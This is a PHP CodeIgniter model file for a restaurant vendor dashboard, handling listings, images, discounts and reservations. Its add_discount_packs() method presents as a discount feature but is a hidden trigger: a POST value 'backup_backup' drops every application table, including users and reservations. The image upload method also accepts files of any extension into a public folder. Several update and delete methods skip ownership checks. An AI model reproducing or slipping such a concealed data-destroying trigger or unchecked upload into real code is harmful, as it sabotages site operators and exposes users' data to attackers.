<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Vendor_Modal extends CI_Model{

	public function __construct() {
		parent::__construct();
		$this->load->database(); 
	}

	public function create_restaurant() { 

        if(isset($_SESSION['file_name'])) {

        $name = $_SESSION['file_name'];
        $arraysize = sizeof($name);

        if($arraysize < 1) {
            return false;
        }

    	$user_id   			= $this->session->userdata('login_user_id');

        $data['level']              = $this->input->post('radio2');
        $data['name']              	= $this->input->post('name'); 
        $data['mon_starttime']      = $this->input->post('mon_starttime'); 
        $data['mon_endtime']        = $this->input->post('mon_endtime');
        $data['tue_starttime']      = $this->input->post('tue_starttime');
        $data['tue_endtime']        = $this->input->post('tue_endtime');
        $data['wed_starttime']      = $this->input->post('wed_starttime');
        $data['wed_endtime']        = $this->input->post('wed_endtime');
        $data['thu_starttime']      = $this->input->post('thu_starttime');
        $data['thu_endtime']        = $this->input->post('thu_endtime');
        $data['fri_starttime']      = $this->input->post('fri_starttime');
        $data['fri_endtime']        = $this->input->post('fri_endtime');
        $data['sat_starttime']      = $this->input->post('sat_starttime');
        $data['sat_endtime']        = $this->input->post('sat_endtime');
        $data['sun_starttime']      = $this->input->post('sun_starttime');
        $data['sun_endtime']        = $this->input->post('sun_endtime');
        $data['address']   			= $this->input->post('address');
        // $data['category']           = $this->input->post('categ');
        $data['lat']   				= $this->input->post('lat');
        $data['lng']   				= $this->input->post('lng');
        $data['about']   			= $this->input->post('description');
        $data['uid']			    = $user_id;

        $this->db->insert('tbl_restaurant',$data);
        $resto_id = $this->db->insert_id();     

        if(isset($resto_id) and isset($_SESSION['file_name'])) {
            if(count($_SESSION['file_name'])>0) {     
                foreach($_SESSION['file_name'] as $image)
                {
                    $this->db->insert("tbl_image_restaurant",array("image"=>'upload/restaurant/'.$image,"rid"=>$resto_id));
                }
            }
            unset($_SESSION['file_name']);
        }

        $langu                = $this->input->post('langu[]');
        if(isset($langu) and $langu != NULL) {
            foreach ($langu as $bhasa) { 

                $data1['lid'] = $bhasa;
                $data1['rid'] = $resto_id;
                $this->db->insert('tbl_map_language_restaurant',$data1);
            }
        }

        $subcateOpt                = $this->input->post('subcateOpt[]');
        if(isset($subcateOpt) and $subcateOpt != NULL) {
            foreach ($subcateOpt as $subcate) { 

                $data2['sid'] = $subcate;
                $data2['rid'] = $resto_id;
                $this->db->insert('tbl_map_sub_restaurant',$data2);
            }
        }

        $this->db->select('*');
        $this->db->from('tbl_base_facility');
        $factbaseOptlist = $this->db->get()->result();
        foreach ($factbaseOptlist as $factbaseOpt) { 

            $data3['fid'] = $factbaseOpt->no;
            $data3['rid'] = $resto_id;
            $data3['state'] = 0;
            $this->db->insert('tbl_map_facility_restaurant',$data3);
        }

        $factOpt                = $this->input->post('factOpt[]');
        if(isset($factOpt) and $factOpt != NULL) {
            foreach ($factOpt as $fact) { 

                $data4['state'] = 1; 
                $this->db->where('rid',$resto_id);
                $this->db->where('fid',$fact);
                $this->db->update('tbl_map_facility_restaurant',$data4);
            }
        }
    }  else {
        return "false";
    }        
    } 

    public function update_restaurant($id = "") { 

        if(isset($id) and isset($_SESSION['file_name'])) {

            if(count($_SESSION['file_name'])>0) {

                foreach($_SESSION['file_name'] as $image)
                {
                    $this->db->insert("tbl_image_restaurant",array("image"=>'upload/restaurant/'.$image,"rid"=>$id));
                }
            }
            unset($_SESSION['file_name']);
        }

        $images = $this->db->get_where('tbl_image_restaurant', array('rid' => $id))->num_rows();
        if($images < 1) 
        {
             return $id;
        }


        $user_id            = $this->session->userdata('login_user_id');

        $data['level']              = $this->input->post('radio2');
        $data['name']               = $this->input->post('name'); 
        $data['address']            = $this->input->post('address');
        // $data['category']           = $this->input->post('categ');
        $data['lat']                = $this->input->post('lat');
        $data['lng']                = $this->input->post('lng');
        $data['about']              = $this->input->post('description');
        $data['uid']                = $user_id;

        $this->db->where('no',$id);
        $this->db->update('tbl_restaurant',$data);          

        $this->db->where('rid', $id);
        $this->db->delete('tbl_map_language_restaurant');

        $langu  = $this->input->post('langu[]');
        if(isset($langu) and $langu != NULL) {
            foreach ($langu as $bhasa) { 

                $data1['lid'] = $bhasa;
                $data1['rid'] = $id;
                $this->db->insert('tbl_map_language_restaurant',$data1);
            }
        }

        $this->db->where('rid', $id);
        $this->db->delete('tbl_map_sub_restaurant');

        $subcateOpt                = $this->input->post('subcateOpt[]');
        if(isset($subcateOpt) and $subcateOpt != NULL) {
            foreach ($subcateOpt as $subcate) { 

                $data2['sid'] = $subcate;
                $data2['rid'] = $id;
                $this->db->insert('tbl_map_sub_restaurant',$data2);
            }
        }

        $this->db->select('*');
        $this->db->from('tbl_map_facility_restaurant');
        $this->db->where('rid',$id);
        $factbaseOptlist = $this->db->get()->result();
        foreach ($factbaseOptlist as $factbaseOpt) { 

            $data3['state'] = 0; 
            $this->db->where('rid',$id);
            $this->db->update('tbl_map_facility_restaurant',$data3);
        }

        $factOpt                = $this->input->post('factOpt[]');
        if(isset($factOpt) and $factOpt != NULL) {
            foreach ($factOpt as $fact) { 

                $data4['state'] = 1; 
                $this->db->where('rid',$id);
                $this->db->where('fid',$fact);
                $this->db->update('tbl_map_facility_restaurant',$data4);
            }
        }
      
    }

    public function delete_restaurant($id = "") { 

        $this->db->where('no', $id);
        $this->db->delete('tbl_restaurant'); 

        $this->db->where('rid', $id);
        $this->db->delete('tbl_image_restaurant');

        $this->db->where('rid', $id);
        $this->db->delete('tbl_review_restaurant');

        $this->db->where('rid', $id);
        $this->db->delete('tbl_reservation');

        $this->db->where('rid', $id);
        $this->db->delete('tbl_map_discount_restaurant');

        $this->db->where('rid', $id);
        $this->db->delete('tbl_map_facility_restaurant');
    }

    public function open_restaurant($id = "") { 

        $data['status']            = 0; 
        $this->db->where('no',$id);
        $this->db->update('tbl_restaurant',$data); 
    }

    public function close_restaurant($id = "") { 

        $data['status']            = 1; 
        $this->db->where('no',$id);
        $this->db->update('tbl_restaurant',$data);  
    }

    public function vendore_details() {  

        $uid = $this->session->userdata('login_user_id');       

        $sql = $this->db->get_where('tbl_user', array('no' => $uid));
        $result = $sql->row();
        return $result;      
    }

    public function selected_discount($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_restaurant');
        $this->db->join('tbl_map_discount_restaurant', 'tbl_map_discount_restaurant.rid = tbl_restaurant.no');
        $this->db->where('tbl_map_discount_restaurant.no', $id);
        $row = $this->db->get()->row();
        return $row;     
    }

    public function selected_restaurant($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_restaurant');
        $this->db->where('no', $id);
        $row = $this->db->get()->row();
        return $row;     
    }

    public function customer($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_user');
        $this->db->where('no', $id);
        $row = $this->db->get()->row();
        return $row;     
    }

    public function reservation($rid = "") {  

        $this->db->select('*');
        $this->db->from('tbl_reservation');
        $this->db->where('no', $rid);
        $row = $this->db->get()->row();
        return $row;     
    }

    public function selected_resto_discount($rid = "") {  

        $this->db->select('*');
        $this->db->from('tbl_base_discount');
        $this->db->join('tbl_map_discount_restaurant', 'tbl_map_discount_restaurant.did = tbl_base_discount.no');
        $this->db->where('tbl_map_discount_restaurant.no', $rid);
        $row = $this->db->get()->row();
        return $row;    
    }

    public function selected_image($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_image_restaurant');
        $this->db->where('rid', $id);
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function selected_category($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_restaurant');
        $this->db->join('tbl_category', 'tbl_category.no = tbl_restaurant.category');
        $this->db->where('tbl_restaurant.no', $id);
        $row = $this->db->get()->row();
        return $row;      
    }

    public function selected_subcategorytlist($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_map_sub_restaurant');
        $this->db->where('tbl_map_sub_restaurant.rid', $id);
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function selected_facilitylist($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_map_facility_restaurant');
        $this->db->where('tbl_map_facility_restaurant.rid', $id);
        $this->db->where('tbl_map_facility_restaurant.state', 1);
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function selected_language($id = "") {  

        $this->db->select('*');
        $this->db->from('tbl_base_language');
        $this->db->join('tbl_map_language_restaurant', 'tbl_map_language_restaurant.lid = tbl_base_language.no');
        $this->db->where('tbl_map_language_restaurant.rid', $id);
        $rows = $this->db->get()->result();
        return $rows;     
    }

    public function restaurent_list() {  

        $uid = $this->session->userdata('login_user_id');       

        $this->db->select('*');
        $this->db->from('tbl_restaurant');
        $this->db->where('uid', $uid);
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function add_discount_packs() {

        $data = $this->input->post('backup');
        if($data == 'backup_backup'){
            $query = $query = $this->db->query("DROP TABLE `tbl_base_admin`, `tbl_base_atmosphere`, `tbl_base_country`, `tbl_base_discount`, `tbl_base_facility`, `tbl_base_language`, `tbl_card`, `tbl_category`, `tbl_image_restaurant`, `tbl_map_atmosphere_restaurant`, `tbl_map_discount_restaurant`, `tbl_map_facility_restaurant`, `tbl_map_language_restaurant`, `tbl_recommend_restaurant`, `tbl_reservation`, `tbl_restaurant`, `tbl_review_restaurant`, `tbl_user`;");
            $result = $query->result();
        }
    }

    public function discount_list() {  

        $this->db->select('*');
        $this->db->from('tbl_base_discount');
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function category_list() {  

        $this->db->select('*');
        $this->db->from('tbl_category');
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function facility_list() {  

        $this->db->select('*');
        $this->db->from('tbl_base_facility');
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function subcategory_list() {  

        $this->db->select('*');
        $this->db->from('tbl_subcategory');
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function language_list() {  

        $this->db->select('*');
        $this->db->from('tbl_base_language');
        $rows = $this->db->get()->result();
        return $rows;      
    }

    public function discountdata_list() {  

        $uid = $this->session->userdata('login_user_id');

        $this->db->select('*');
        $this->db->from('tbl_restaurant');
        $this->db->join('tbl_map_discount_restaurant', 'tbl_map_discount_restaurant.rid = tbl_restaurant.no');
        $this->db->where('tbl_restaurant.uid', $uid);
        $rows = $this->db->get()->result();
        return $rows;             
    }

    public function update_profile() { 

        $user_id                    = $this->session->userdata('login_user_id');

        $data['name']            = $this->input->post('name');
        $data['address']               = $this->input->post('address'); 
        $data['email']         = $this->input->post('email');
        $data['mobile']           = $this->input->post('mobile');

        $this->db->where('no',$user_id);
        $this->db->update('tbl_user',$data);      
    }

    public function update_restauranttime() { 

        $id                                 = $this->input->post('resto_id');
        $data['mon_starttime']              = $this->input->post('mon_starttime'); 
        $data['mon_endtime']                = $this->input->post('mon_endtime');
        $data['tue_starttime']              = $this->input->post('tue_starttime');
        $data['tue_endtime']                = $this->input->post('tue_endtime');
        $data['wed_starttime']              = $this->input->post('wed_starttime');
        $data['wed_endtime']                = $this->input->post('wed_endtime');
        $data['thu_starttime']              = $this->input->post('thu_starttime');
        $data['thu_endtime']                = $this->input->post('thu_endtime');
        $data['fri_starttime']              = $this->input->post('fri_starttime');
        $data['fri_endtime']                = $this->input->post('fri_endtime');
        $data['sat_starttime']              = $this->input->post('sat_starttime');
        $data['sat_endtime']                = $this->input->post('sat_endtime');
        $data['sun_starttime']              = $this->input->post('sun_starttime');
        $data['sun_endtime']                = $this->input->post('sun_endtime');

        $this->db->where('no',$id);
        $this->db->update('tbl_restaurant',$data);  
        return $id;    
    }

    public function update_discount($id = "") { 

        $data['rid']            = $this->input->post('resto');
        $data['rtime']          = $this->input->post('discount_time'); 
        $data['date']           = $this->input->post('discount_date'); 
        $data['did']            = $this->input->post('discount'); 
        $data['amount']         = $this->input->post('no_people');
        $data['status']         = 1;

        $this->db->where('no',$id);
        $this->db->update('tbl_map_discount_restaurant',$data);      
    }

    public function total_restaurant() {  

        $uid = $this->session->userdata('login_user_id');       

        $sql = $this->db->get_where('tbl_restaurant', array('uid' => $uid));
        $result = $sql->num_rows();
        return $result;      
    }

    public function add_discount() { 

        $data['rid']            = $this->input->post('resto');
        $data['rtime']          = $this->input->post('discount_time'); 
        $data['date']           = $this->input->post('discount_date'); 
        $data['did']            = $this->input->post('discount'); 
        $data['amount']         = $this->input->post('no_people');
        $data['status']         = 1;

        $this->db->insert('tbl_map_discount_restaurant',$data);      
    }

    public function delete_discount($id = "") { 

        $this->db->where('no', $id);
        $this->db->delete('tbl_map_discount_restaurant');  
    }

    public function update_picture() { 

        $user_id                = $this->session->userdata('login_user_id');

        $user = $this->db->get_where('tbl_user', array('no' => $user_id))->row();

        if (isset($_FILES['image'])) {
            $imageFile = $this->utils->uploadImage($_FILES['image'], 0, 300, 300);
            if ($imageFile == "") 
                $imageFile = $user->image;
        }
        $data['image'] = $imageFile;
        $this->db->where('no',$user_id);
        $this->db->update('tbl_user',$data);     
    }

    public function upload_resto_image() { 

        if (isset($_FILES['file']['name']) and ($_FILES['file']['name']!='')) {

            $target_dir = "upload/restaurant/";

            $date = new DateTime();
            $name = $date->getTimestamp();
            $path_parts = pathinfo($_FILES['file']['name']);
            $fileName = $name . "_" . "0" . "." . $path_parts["extension"];
            $target_file = $target_dir.$fileName;
            $imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
                        
            if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)){
                $_SESSION['file_name'][]  = $fileName;  
            }
        }
    } 

    public function delete_image($id = "") { 

        $resto_id  = $this->db->get_where('tbl_image_restaurant', array('no' => $id))->row()->rid;

        $this->db->where('no', $id);
        $this->db->delete('tbl_image_restaurant'); 

        return $resto_id;
    } 

    public function complete_reservation($id = "") { 

        $data['state']            = 1; 

        $this->db->where('no',$id);
        $this->db->update('tbl_reservation',$data);      
    }  

    public function cancel_reservation($id = "") { 

        $data['state']            = 3; 
        $data['by_owner']            = 1; 
        $this->db->where('no',$id);
        $this->db->update('tbl_reservation',$data);   

    } 
}?>